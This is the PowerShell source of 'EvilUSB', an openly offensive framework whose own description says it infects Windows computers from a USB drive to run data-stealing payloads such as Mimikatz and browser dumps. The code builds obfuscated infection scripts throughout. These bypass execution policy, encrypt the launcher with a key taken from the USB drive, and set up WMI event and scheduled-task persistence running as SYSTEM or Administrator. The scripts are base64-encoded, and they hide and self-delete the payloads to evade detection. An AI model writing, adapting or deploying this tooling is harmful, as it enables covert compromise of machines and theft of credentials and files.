<#
	This file is part of EvilUSB
	
	Copyright 2017 @H3LL0WORLD

	Licensed under the Apache License, Version 2.0 (the "License");
	you may not use this file except in compliance with the License.
	You may obtain a copy of the License at

	http://www.apache.org/licenses/LICENSE-2.0

	Unless required by applicable law or agreed to in writing, software
	distributed under the License is distributed on an "AS IS" BASIS,
	WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
	See the License for the specific language governing permissions and
	limitations under the License.
#>
Function Invoke-PromptForChoice {
    Param (
        [String] $Title,
        [String] $Message,
        [Object[]] $Options,
        [Int32] $DefaultOption = 0
    )

    $Opciones = @()

    Foreach ($Option in $Options) {
        if ($Option.GetType().Name -eq 'Object[]' -and $Option.Length -eq 2) {
            $Opciones += New-Object Management.Automation.Host.ChoiceDescription $Option[0],$Option[1]
        } elseif ($Option.GetType().Name -eq 'String') {
            $Opciones += New-Object Management.Automation.Host.ChoiceDescription $Option
        }
    }

    return $Host.UI.PromptForChoice($Title,$Message,[System.Management.Automation.Host.ChoiceDescription[]] $Opciones, $DefaultOption)
}
Function Get-WindowSize {
	return $Host.UI.RawUI.WindowSize
}
Function Set-WindowSize {
	Param (
		[Management.Automation.Host.Size] $WindowSize
	)
	if ($WindowSize.Height -gt $Host.UI.RawUI.MaxWindowSize.Height)
	{
		$WindowSize.Height = $Host.UI.RawUI.MaxWindowSize.Height
	}
	if ($WindowSize.Width -gt $Host.UI.RawUI.MaxWindowSize.Width)
	{
		$WindowSize.Width = $Host.UI.RawUI.MaxWindowSize.Width
	}
	
	$Host.UI.RawUI.WindowSize = $WindowSize
}
Function Get-BackgroundColor {
    return @{
        # Return background color
        BackgroundColor = $Host.UI.RawUI.BackgroundColor
        ErrorBackgroundColor = $Host.PrivateData.ErrorBackgroundColor
        WarningBackgroundColor = $Host.PrivateData.WarningBackgroundColor
        DebugBackgroundColor = $Host.PrivateData.DebugBackgroundColor
        VerboseBackgroundColor = $Host.PrivateData.VerboseBackgroundColor
        ProgressBackgroundColor = $Host.PrivateData.ProgressBackgroundColor
    }
}

Function Set-BackgroundColor {
    Param (
        $Color
    )
    try {
        $Host.UI.RawUI.BackgroundColor = $Color.BackgroundColor
        $Host.PrivateData.ErrorBackgroundColor = $Color.ErrorBackgroundColor
        $Host.PrivateData.WarningBackgroundColor = $Color.WarningBackgroundColor
        $Host.PrivateData.DebugBackgroundColor = $Color.DebugBackgroundColor
        $Host.PrivateData.VerboseBackgroundColor = $Color.VerboseBackgroundColor
        $Host.PrivateData.ProgressBackgroundColor = $Color.ProgressBackgroundColor
    } finally {
        Clear-Host
    }
}

Function TypeWrite-Host {
    Param (
        $Text,
        [ConsoleColor] $ForegroundColor,
        [Int32] $Delay = 50,
        [Int32] $EndSleep = 0,
        [Switch] $NoNewLine
    )
    PROCESS {
        Foreach ($Char in $Text.ToCharArray()) {
            if ($ForegroundColor) {
                Write-Host $Char -NoNewLine -ForegroundColor $ForegroundColor
            } else {
                Write-Host $Char -NoNewLine
            }
            Start-Sleep -Mil $Delay
        }
    }
    END {
        if ($EndSleep -gt 0){
            Start-Sleep -Mil $EndSleep
        }
        if (-Not $NoNewLine) {
            Write-Host ''
        }
    }
}

Function EvilUSB:Print {
    Param (
        [ValidateSet(0, 1, 2, 3)]
        $Mode,
        [String] $Text,
        [Switch] $NoNewline
    )

    BEGIN {
        Switch ($Mode) {
            #0 { Write-Host '[*] ' -NoNewLine}
            0 { Write-Host '[*] ' -NoNewLine -ForegroundColor White }

            #1 { Write-Host '[!] Error: ' -NoNewLine}
            1 { Write-Host '[!] Error: ' -NoNewLine -ForegroundColor Red }

            #2 { Write-Host '[>] ' -NoNewLine}
            2 { Write-Host '[>] ' -NoNewLine -ForegroundColor Green }

            3 { Write-Host '[?] ' -NoNewLine}
            #3 { Write-Host '[?] ' -NoNewLine -ForegroundColor Cyan }
        }
    }
    
    PROCESS {
        if ($NoNewline) {
            Write-Host $Text -ForegroundColor White -NoNewline
        } else {
            Write-Host $Text -ForegroundColor White
        }
    }

}

Function Get-Volumes {
    BEGIN {
        # Obtener los volumenes diferentes al disco local
        $Volumes = Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE DriveLetter != '$env:HOMEDRIVE'"
    }

    PROCESS {
        if ($Volumes) {
            return $Volumes
        } else {
            EvilUSB:Print 1 "$($LANG[5])"
            return $false
        }

    }

    END {}

}

Function AskForVolume {
    BEGIN {
        do {
            $Volumes = Get-Volumes
            if (-not $Volumes) {
                EvilUSB:Print 3 $LANG[4] -NoNewLine
                $null = Read-Host
            }
        } until ($Volumes)

        # Borrar caracteres indeseados de los ids de los dispositivos
        for ($i=0; $i -lt $Volumes.Length; $i++) {
            $Volumes[$i].DeviceId = $Volumes[$i].DeviceId.Trim("\?Volume{}")
        }
    }

    PROCESS {
        #EvilUSB:Print 3 $LANG[2]
        TypeWrite-Host '' -NoNewline -EndSleep 1000;TypeWrite-Host $LANG[2] -EndSleep 500
		
		$Format = @{Expression={$_.DriveLetter}; Label = "DriveLetter"; Width = 20; Alignment = "Left"},
				  @{Expression={$_.Label}; Label = "Label"; Width = 40; Alignment = "Left"},
				  @{Expression={$_.DeviceID}; Label = "DeviceID"; Width = 40; Alignment = "Left"},
				  #@{Expression={$_.Capacity}; Label = "Capacity"; Alignment = "Left"}
				  @{Expression={[Math]::round($_.Capacity / 1GB, 2).ToString() + " GB"}; Label = "Capacity"; Alignment = "Left"}
		
        while ($true) {
            #Clear-Host
            $Volumes | Sort-Object -Property Capacity -Descending | Format-Table $Format | Out-Host
			TypeWrite-Host $LANG[3] -NoNewline -Delay 10
            #Write-Host $LANG[3] -NoNewLine
            $DriveLetter = Read-Host
            Foreach ($Volume in $Volumes) {
                if ($Volume.DriveLetter -eq "$($DriveLetter[0]):") {
                    return $Volume
                }
            }
        }
    }
}
Function EvilUSB:Info {
	$Info = New-Object PSObject -Property @{
		Name = "Evil USB`n"
		Author = "@H3ll0WORLD`n"
		Description = "EvilUSB es un framework para automatizar el proceso de infeccion de ordenadores windows con el fin de ejecutar payloads desde una USB de manera automatica.
Cuenta con una gran variedad de payloads, enfocados principalmente en exfiltrar informacion o archivos, por mencionar algunos: Mimikatz, GoogleChrome Dump, Firefox Dump...
Ademas el desarrollo de nuevos payloads es bastante facil e intuitiva.
"
		Sinopsis = "EvilUSB usa propiedades unicas de la USB para identificarla tales como el ID y la capacidad total de almacenamiento.
Adicionalmente la infeccion es totalmente fileless (sin ningun archivo en el disco), lo cual hace que sea dificil de detectar y aun mas dificil de remover.
WMI es usado para detectar cuando un nuevo dispositivo es insertado, posteriormente intenta desencriptar el codigo que ejecuta el payload usando como clave el ID y Capacidad de los dispositivos conectados actualmente; de manera que no se puede ver/ejecutar el codigo real si el dispositivo correcto no esta insertado.
"
		Facebook = "https://www.facebook.com/HolaMundo.YT"
		Twitter = "https://twitter.com/H3LL0WORLD"
		Patreon = "https://patreon.com/HelloWorldYT"
		Youtube = "https://www.youtube.com/channel/UCN1R36uVmYCnfKj-1YTSivA"
	}
	$Info | Format-List Name, Author, Description, Sinopsis, Twitter, Patreon, Facebook, Youtube
}
Function EvilUSB:Help {
	$Format = @{Expression={$_.Name};Label="Command"},
			  @{Expression={$_.Description};Label="Description"}
	
    $Global:Opciones.Values | Sort-Object -Property Name | Format-Table $Format
	
	$Format = @{Expression={$_.Name};Label="Alias"},
			  @{Expression={$_.Description};Label="Description"}

	$Global:Aliases.Values | Format-Table $Format
}

Function EvilUSB:CheckVersion {
	BEGIN {
		$OnlineVersion = 'https://github.com/H3LL0WORLD/EvilUSB/raw/master/version.txt'
		$LocalVersion = "$PWD\version.txt"
	}
	
	PROCESS {
		$LocalVersion = ([IO.File]::ReadAllText($LocalVersion))
		Write-Host "EvilUSB v$LocalVersion (" -NoNewLine
		try
		{
			$OnlineVersion = (New-Object Net.WebClient).DownloadString($OnlineVersion)
			if ($OnlineVersion -eq $LocalVersion)
			{
				Write-Host "Latest" -ForegroundColor Green -NoNewLine
			}
			else
			{
				Write-Host "Outdated" -ForegroundColor Red -NoNewLine
				Write-Host ")`nEvilUSB v$($OnlineVersion.Replace("`n",'')) (" -NoNewLine
				Write-Host "Latest" -ForegroundColor Green -NoNewLine
			}
		}
		catch {
			Write-Host "Error Checking" -ForegroundColor Red -NoNewLine
		}
		finally {
			Write-Host ")"
		}
	}
}

Function EvilUSB:Exit {
    TypeWrite-Host 'Bye, bye...' -EndSleep 400
	# Restore WindowSize
    Set-WindowSize $Global:WindowSize
	Remove-Variable -Name WindowSize -Scope Global
    # Restore WindowTitle
    $Host.UI.RawUI.WindowTitle = $Global:WindowTitle
	Remove-Variable -Name WindowTitle -Scope Global
    # Restore BackgroundColor
    Set-BackgroundColor $Global:BackgroundColor

	#Remove variables
	$Variables = ('WindowSize','WindowTitle','BackgroundColor','Opciones','Payloads','PayloadsToWrite','Settings','Volume','Aliases')
	Remove-Variable -Name $Variables -Scope Global -Force -ErrorAction SilentlyContinue

	#[Environment]::Exit(0)
    return
}

Function Encrypt
{
	Param
	(
		[Byte[]] $Plain,
		[String] $Password,
		[Byte[]] $SALT
	)
	$pDB = New-Object Security.Cryptography.Rfc2898DeriveBytes ($Password,$SALT)
	$RM = New-Object Security.Cryptography.RijndaelManaged
	$RM.Key = $pDB.GetBytes(32)
	$RM.IV = $pDB.GetBytes(16)
	$MemoryStream = New-Object IO.MemoryStream
	$CryptoStream = New-Object Security.Cryptography.CryptoStream $MemoryStream, $RM.CreateEncryptor(), 'Write'
	$CryptoStream.Write($Plain, 0, $Plain.Length)
	$CryptoStream.Close()
	return $MemoryStream.ToArray()
}

Function EvilUSB:Infect {

	Function Remove-Comments ([Object] $String)
	{
		$Bloque = 0
		$rString = "";
		Foreach ($Line in $String)
		{
			if ($Line.TrimStart().StartsWith('<#'))
			{
				$Bloque++
			}
			if ($Line.TrimEnd().StartsWith('#>'))
			{
				$Bloque--
			}
			if ($Bloque -eq 0 -and -not $Line.TrimStart().StartsWith('#'))
			{
				$rString += "$Line`n"
			}
		}
		return $rString
	}

    # Forzamos la politica de ejecucion a 'Bypass' para que en caso de que sea un script de powershell no haya problema :)
    $Command = "Set-ExecutionPolicy ByPass -F;"
    # Nos movemos al directorio raiz de nuestro dispositivo
    $Command += "CD (gwmi Win32_Volume -F {DeviceId LIKE '%$($Global:Volume.DeviceId)%'}).Name;"
    ##Presionamos block mayus 4 veces para tener una confirmacion visual de que el payload se ejecutará
    #$CommandLine += '$W = New-Object -C WScript.Shell;'
    #$CommandLine += 'for ($i=0;$i -lt 4;$i++){$W.SendKeys(''{CapsLock}'');Sleep -M 150};'

	# Obtenemos el nombre del payload
	$Command += '$N=@(ls -Fo ''' + $Global:Settings.ScriptNames.Payload + '.*'')[0];'
	# Si el nombre contiene mayusculas, ejecutarlo como SYSTEM
	$Command += 'if($N.Name -cmatch "^[A-Z]"){&$N}'
	# Si no
	$Command += 'else{'
		# Crear una clave en el registro con la ruta al payload
	$Command += 'New-ItemProperty -Pa ' + $Global:Settings.Persistence.ScheduleTask.Registry.Path + ' -N ' + $Global:Settings.Persistence.ScheduleTask.Registry.Name + ' -Pr 0 -Va $N.FullName -Fo;'
		# Iniciar la tarea programada (que se encargará de ejecutar el payload)
	$Command += 'schtasks.exe /RUN /TN ' + ('"' + $Global:Settings.Persistence.ScheduleTask.TaskName.Replace('"','') + '"') + '}'
	
	# Encriptar el script usando la capacidad del dispositivo como contraseña y el ID como salto
	$Cipher = Encrypt -Plain ([Text.Encoding]::UTF8.GetBytes($Command)) -Password $Global:Volume.Capacity -SALT ([Text.Encoding]::UTF8.GetBytes($Global:Volume.DeviceID))
	# Convertir los bytes encriptados a b64
	$EncCipher = [Convert]::ToBase64String($Cipher)

	$Script = Get-Content .\data\scripts_source\AES_Template.ps1 | Out-String
	
	$Script = $Script.Replace('#CIPHER#', $EncCipher)

    $CommandLine = '-Enc ' + [Convert]::ToBase64String( [Text.Encoding]::Unicode.GetBytes($Script))

	$WMIScriptSource = Get-Content .\data\scripts_source\WMI-USBPersistence.ps1
	# Remover comentarios
	$WMIScriptSource = Remove-Comments $WMIScriptSource
	
    $WMIScriptSource = $WMIScriptSource.Replace('$CommandLineTemplate', " $CommandLine")
	$WMIScriptSource = $WMIScriptSource.Replace('$FilterName', $Global:Settings.Persistence.WMI.FilterName)
	$WMIScriptSource = $WMIScriptSource.Replace('$ConsumerName', $Global:Settings.Persistence.WMI.ConsumerName)

	# Obtenemos la ruta del payload
	$Arguments = '$PayloadPath = (Get-ItemProperty -Path ' + $Global:Settings.Persistence.ScheduleTask.Registry.Path + ' -Name ' + $Global:Settings.Persistence.ScheduleTask.Registry.Name + ').' + $Global:Settings.Persistence.ScheduleTask.Registry.Name + ';'
	# Eliminar la clave del registro
	$Arguments += 'Remove-ItemProperty -Pa ' + $Global:Settings.Persistence.ScheduleTask.Registry.Path + ' -N ' + $Global:Settings.Persistence.ScheduleTask.Registry.Name + ' -Fo;'
	# Cambiamos al disco donde se encuentra el payload
	$Arguments += '.$PayloadPath.Split(''\'')[0];'
	# Ejecutamos el payload
	$Arguments += '.$PayloadPath'

	# Encodeamos los argumentos
	$Arguments = '-Enc ' + [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Arguments))

	$ScheduleTaskScriptSource = Get-Content .\data\scripts_source\ScheduleTask-Persistence.ps1
	# Remover comentarios
	$ScheduleTaskScriptSource = Remove-Comments $ScheduleTaskScriptSource
	# Agregar argumentos
	$ScheduleTaskScriptSource = $ScheduleTaskScriptSource.Replace('$Arguments',$Arguments)
	# Cambiar nombre de la tarea programada
	$ScheduleTaskScriptSource = $ScheduleTaskScriptSource.Replace('TaskName','"' + $Global:Settings.Persistence.ScheduleTask.TaskName.Replace('"','') + '"')

    $ScriptSource = $WMIScriptSource + $ScheduleTaskScriptSource

    $EncScriptSource = [Convert]::ToBase64String( [Text.Encoding]::Unicode.GetBytes($ScriptSource) )

    $FormatFile = Invoke-PromptForChoice -Title 'Formato script de infeccion' -Message $LANG[18] -Options (('&Vbs','Script de Windows'),('&Bat',''),('&Cancel','Volver al menu principal'))
    Switch ($FormatFile) {
        0 {
			""
            # Vbs
            EvilUSB:Print 0 $LANG[20]

            $InfectScript = Get-Content .\data\scripts_source\template.vbs | Out-String
            $InfectScript = $InfectScript.Replace("'Argumentos'", ('-W 1 -Enc ' + $EncScriptSource))

            $Dest = $Global:Volume.Name + $Global:Settings.ScriptNames.Infect + '.vbs'
        }
        1 {
			""
            #Bat
            EvilUSB:Print 0 $LANG[19]

            $InfectScript = Get-Content .\data\scripts_source\template.bat | Out-String
            $InfectScript = $InfectScript.Replace('Argumentos', ('-Enc ' + $EncScriptSource))
            
            $Dest = $Global:Volume.Name + $Global:Settings.ScriptNames.Infect + '.bat'
        }
        Default {
			# Cancelar
			EvilUSB:Print 0 $LANG[14]
			return
        }
        #EvilUSB:Print 1 $LANG[21]
    }

    $RemoveScript? = Invoke-PromptForChoice -Title 'Auto-eliminar script' -Message 'Eliminar script de infeccion despues de su ejecucion?' -Options (('&Yes','Auto-eliminar payload'),('&No','No auto-eliminar'),('&Cancel','Volver al menu principal'))
    Switch ($RemoveScript?) {
        1 {
            # No
            # Do nothing
        }
        0 {
            # Yes
            Switch ($FormatFile) {
                0 {
                    # Vbs
                    $InfectScript += 'CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName'
                }

                1 {
                    # Bat
                    $InfectScript += 'if exist infect.bat (del /q ' + $Global:Settings.ScriptNames.Infect + '.bat)'
                }
            }
        }
        Default {
			# Cancelar
			EvilUSB:Print 0 $LANG[14]
			return
        }
    }
	
    if (Test-Path $Dest) {
		""
        EvilUSB:Print 1 $LANG[22]
        $ReplaceScript? = Invoke-PromptForChoice -Title 'Reemplazar script de infeccion' -Message $LANG[23] -Options (('&Yes','Reemplazar script'),('&No','No reemplazar script'))
        Switch ($ReplaceScript?) {
            1 {
                EvilUSB:Print 0 $LANG[25]
                return
            }
            Default {
                EvilUSB:Print 0 "$($LANG[24]): $Dest"
            }
        }
    } else {
		""
        EvilUSB:Print 0 "$($LANG[26]): $Dest"
    }
    Set-Content -Value $InfectScript -Path $Dest -Force
    EvilUSB:Print 2 $LANG[27]
}

Function EvilUSB:Remove {

    $WMIScriptSource = Get-Content .\data\scripts_source\Remove_WMI-USBPersistence.ps1 | Out-String   
    $WMIScriptSource = $WMIScriptSource.Replace('$FilterName', $Global:Settings.Persistence.WMI.FilterName).Replace('$ConsumerName', $Global:Settings.Persistence.WMI.ConsumerName)

	$ScheduleTaskScriptSource = Get-Content .\data\scripts_source\Remove-ScheduleTask-Persistence.ps1 | Out-String
	$ScheduleTaskScriptSource = $ScheduleTaskScriptSource.Replace('TaskName','"' + $Global:Settings.Persistence.ScheduleTask.TaskName.Replace('"','') + '"')

	$ScriptSource = $WMIScriptSource + $ScheduleTaskScriptSource
    
    $EncScriptSource = [Convert]::ToBase64String( [Text.Encoding]::Unicode.GetBytes($ScriptSource) )

    $FormatFile = Invoke-PromptForChoice -Title 'Formato script' -Message $LANG[18] -Options (('&Vbs','Script de Windows'),('&Bat',''))
	""
    Switch ($FormatFile) {
        0 {
            # Vbs
            EvilUSB:Print 0 $LANG[20]

            $RemoveScript = Get-Content .\data\scripts_source\template.vbs | Out-String
            $RemoveScript = $RemoveScript.Replace("'Argumentos'", ('-W 1 -Enc ' + $EncScriptSource))

            $Dest = $Global:Volume.Name + $Global:Settings.ScriptNames.Remove + '.vbs'
        }
        1 {
            #Bat
            EvilUSB:Print 0 $LANG[19]

            $RemoveScript = Get-Content .\data\scripts_source\template.bat | Out-String
            $RemoveScript = $RemoveScript.Replace('Argumentos', ('-enc ' + $EncScriptSource))
            
            $Dest = $Global:Volume.Name + $Global:Settings.ScriptNames.Remove + '.bat'
        }
        #EvilUSB:Print 1 $LANG[21]
    }
    
    if (Test-Path $Dest) {
        EvilUSB:Print 1 $LANG[22]
        $ReplaceScript? = Invoke-PromptForChoice -Title 'Reemplazar script' -Message $LANG[23] -Options (('&Yes','Reemplazar script'),('&No','No reemplazar script'))
		""
        Switch ($ReplaceScript?) {
            1 {
                EvilUSB:Print 0 $LANG[25]
                return
            }
            Default {
                EvilUSB:Print 0 "$($LANG[24]): $Dest"
            }
        }
    } else {
        EvilUSB:Print 0 "$($LANG[26]): $Dest"
    }
    Set-Content -Value $RemoveScript -Path $Dest -Force
    EvilUSB:Print 2 $LANG[27]
}

Function EvilUSB:LoadPayloads {
	BEGIN {
		$PayloadsToOmite = @("payload_base.ps1")
		$PayloadsPath = Resolve-Path ./lib/Payloads
	}
	
	PROCESS {
		$Payloads = Get-ChildItem -Path $PayloadsPath -Filter *.ps*1 -Recurse
		$Global:Payloads = @{
			Path = $PayloadsPath
			Names = foreach ($Payload in $Payloads) {
				$Flag = !([Bool]($PayloadsToOmite -eq $Payload.Name))
				if ($Flag)
				{
					$Payload.FullName.Replace($PayloadsPath,"").Replace($Payload.Extension,"").Remove(0,1)
				}
			}
			Paths = foreach ($Path in $Payloads.FullName) {
				$flag = !([Bool]($($PayloadsToOmite | % {Join-Path $PayloadsPath $_}) -eq $Path))
				if ($flag)
				{
					$Path
				}
			}
		}
	}
	
	END {
		#Write-host $Payloads.FullName
		Write-Host "`t`t`t`t`t  " $Global:Payloads.Names.Count -ForegroundColor Green -NoNewline
		Write-Host " $($LANG[6])`n"
	}
}

Function EvilUSB:UsePayload {
    Param (
		[String] $PayloadName
	)

	BEGIN {
		$PosiblesPayloads = @()
		if ($Global:Payloads.Names -eq $PayloadName) {
			$PosiblesPayloads = @($PayloadName)
		} else {
			foreach ($Payload in $Global:Payloads.Names) {
				if ($Payload.ToLower().StartsWith($PayloadName.ToLower())) {
					$PosiblesPayloads += $Payload
				}
			}
		}
	}

	PROCESS {
		if ($PosiblesPayloads.Length -eq 1) {
			if ($Global:Payloads.Names.GetType().Name -eq "String") # En caso de que solo hay un payload :p
			{
				$Payload2Use = $Global:Payloads.Names
			}
			else
			{
				$Payload2Use = @($Global:Payloads.Names -eq $PosiblesPayloads[0])[0]
			}
			EvilUSB:Print 0 "$($LANG[7])" -NoNewLine
			Write-Host $Payload2Use -ForegroundColor Green
			
			try
			{
				IEX (Get-Content (@(Get-ChildItem $Global:Payloads.Path ($Payload2Use + '.ps*1'))[0]).FullName | Out-String)
			}
			catch
			{	
				Write-Warning $Error[0].Exception
				# Empty Payload
			}
		} else {
			$Length = $PayloadName.Length
			Foreach ($PosiblePayload in $PosiblesPayloads) {
				Write-Host $PosiblePayload.Remove($Length) -ForegroundColor Green -NoNewLine
				Write-Host $PosiblePayload.Remove(0,$Length) -ForegroundColor DarkGreen
			}
		}
	}
}

Function EvilUSB:ManagePayloads {
	Param (
		[Switch] $Reset,
		[Switch] $Write,
        [Switch] $Show
	)
	if ($Reset) {
		if (-not [Bool]($Global:PayloadsToWrite))
		{
			# First run
			$Global:PayloadsToWrite = @{}
			return
		}
		if ($Global:PayloadsToWrite.Count -gt 0)
		{
			$Global:PayloadsToWrite = @{}
			EvilUSB:Print 0 "Payloads reseteados"
		}
		else
		{
			EvilUSB:Print 1 "Nada para resetear"
		}
    } elseif ($Show) {
		if ($Global:PayloadsToWrite.Count -gt 0)
		{
			EvilUSB:Print 0 "Payloads count: " -NoNewline
			Write-Host $Global:PayloadsToWrite.Count -ForegroundColor Green

			$Global:PayloadsToWrite.Values | Format-Table
		}
		else
		{
			EvilUSB:Print 1 "Nada para mostrar"
		}
	} elseif ($Write) {
		if ($Global:PayloadsToWrite.Count -eq 0) {
			#Nothing to write
            EvilUSB:Print 1 "$($LANG[8])"
		} else  {
			# Separar los payloads por el usuario que los debe ejecutar
			$SYSTEMPayloads = @{}
			$Global:PayloadsToWrite.Keys | ? {
				$Global:PayloadsToWrite.($_).User -eq "SYSTEM"
			} | % {
				$SYSTEMPayloads.Add($_,$Global:PayloadsToWrite.($_))
			}

			$ADMINPayloads = @{}
			$Global:PayloadsToWrite.Keys | ? {
				$Global:PayloadsToWrite.($_).User -eq "Administrator"
			} | % {
				$ADMINPayloads.Add($_,$Global:PayloadsToWrite.($_))
			}
			<#
			$SYSTEMPayloads = $Global:PayloadsToWrite.Values | ? {$_.User -eq "SYSTEM"}
			$ADMINPayloads = $Global:PayloadsToWrite.Values | ? {$_.User -eq "Administrator"}
			#>
			if ($SYSTEMPayloads.Count -gt 0 -and $ADMINPayloads.Count -gt 0)
			{
				$msg = "No se pueden ejecutar payloads para diferentes usuarios a la misma vez`n(Mira la ayuda para ver la descripcion)"
				$Opciones = @(
					('&A) All Admin','Escribir todos los payloads como Administrador (Recomendado)'),
					('&B) All System','Escribir todos los payloads como System'),
					('&C) Only Admin','Escribir solo los payloads a ejecutarse como Administrador'),
					('&D) Only System','Escribir solo los payloads a ejecutarse como System'),
					('&E) Back','No hacer nada')
				)
				$AnsPayloads? = Invoke-PromptForChoice -Title 'Seleccionar payloads' -Message $msg -Options $Opciones
				Switch ($AnsPayloads?) {
				0 {
                    # A
					$Payloads = $ADMINPayloads + $SYSTEMPayloads
					# Destino del payload
					$Dest = $Global:Volume.Name + $Global:Settings.ScriptNames.Payload.ToLower() + '.ps1'
                }
				1 {
                    # B
					$Payloads = $ADMINPayloads + $SYSTEMPayloads
					# Destino del payload
					$Dest = $Global:Volume.Name + $Global:Settings.ScriptNames.Payload.ToUpper() + '.ps1'
                }
				2 {
                    # C
					$Payloads = $ADMINPayloads
					# Destino del payload
					$Dest = $Global:Volume.Name + $Global:Settings.ScriptNames.Payload.ToLower() + '.ps1'
                }
                3 {
                    # D
					$Payloads = $SYSTEMPayloads
					# Destino del payload
					$Dest = $Global:Volume.Name + $Global:Settings.ScriptNames.Payload.ToUpper() + '.ps1'
                }
                Default {
                    # E
					return;
                }
            }
			}
			elseif ($ADMINPayloads.Count -gt 0)
			{
				$Payloads = $ADMINPayloads
				# Destino del payload
				$Dest = $Global:Volume.Name + $Global:Settings.ScriptNames.Payload.ToLower() + '.ps1'
			}
			elseif ($SYSTEMPayloads.Count -gt 0)
			{
				$Payloads = $SYSTEMPayloads
				# Destino del payload
				$Dest = $Global:Volume.Name + $Global:Settings.ScriptNames.Payload.ToUpper() + '.ps1'
			}
			
			# Preguntar si se quiere ocultar el payload
            #EvilUSB:Print 3 "$($LANG[9])" -NoNewLine
            $HidePayload? = Invoke-PromptForChoice -Title 'Ocultar payload' -Message $LANG[9] -Options (('&Yes','Ocultar payload'),('&No','No ocultar payload'),('&Cancel','Volver al menu principal'))
            Switch ($HidePayload?) {
                0 {
                    # Yes
                    $HidePayload = $true
                }
				1 {
                    # No
                    $HidePayload = $false
                }
                Default {
                    # Cancelar
					EvilUSB:Print 0 $LANG[14]
                    return
                }
            }

            # Preguntar si se quiere que el payload se autoelimine
            #EvilUSB:Print 3 "$($LANG[10])" -NoNewLine
            $RemovePayload? = Invoke-PromptForChoice -Title 'Auto-eliminar payload' -Message $LANG[10] -Options (('&Yes','Auto-eliminar payload'),('&No','No auto-eliminar'),('&Cancel','Volver al menu principal'))
            Switch ($RemovePayload?) {
                0 {
                    # Yes
                    $RemovePayload = $true
                }
                1 {
                    # No
                    $RemovePayload = $false
                }
				Default {
                    # Cancelar
					EvilUSB:Print 0 $LANG[14]
                    return
                }
            }

            if (Test-Path $Dest) {					
				# Si hay un payload en el destino, preguntar si sobre-escribirlo o no
				""
				EvilUSB:Print 1 $LANG[12]
				#EvilUSB:Print 3 $LANG[11] -NoNewLine
                $RemovePayload? = Invoke-PromptForChoice -Title 'Reemplazar payload' -Message $LANG[11] -Options (('&Yes','Si, reemplazar'),('&No','No reemplazar'))
                Switch ($RemovePayload?) {
                    1 {
                        # No
                        EvilUSB:Print 0 $LANG[14]
                        return
                    }
                    Default {
                        # Yes
                        EvilUSB:Print 0 "$($LANG[13]): $Dest"
						Remove-Item -Path $Dest -Force
                    }
                }
			} else {
                EvilUSB:Print 0 "$($LANG[15]): $Dest"
            }
			
			# Unir el codigo de todos los payloads
			try {
				$PayloadsCode = ($Payloads.Values | Select Code).Code | Out-String

				if ($RemovePayload) {
					# Si hay que auto eliminar el payload
					$PayloadsCode = '$Global:Me = Join-Path $PWD ''' + $Global:Settings.ScriptNames.Payload + ".ps1' -Resolve;`n" + 
									$PayloadsCode +
									'Remove-Item $Global:Me -Force'
				}
			} finally {
				# Escribir el Payload
				[IO.File]::WriteAllText($Dest, $PayloadsCode)
				#Set-Content -Value $PayloadsCode -Path $Dest -Force
			}

			if ($HidePayload) {
				EvilUSB:Print 0 $LANG[16]
				Set-ItemProperty $Dest -Name Attributes -Value 'ReadOnly, Hidden, System, Archive'
			} else {
                Set-ItemProperty $Dest -Name Attributes -Value 'Archive'
            }
			EvilUSB:Print 2 $LANG[17]
			
		}
	}
}
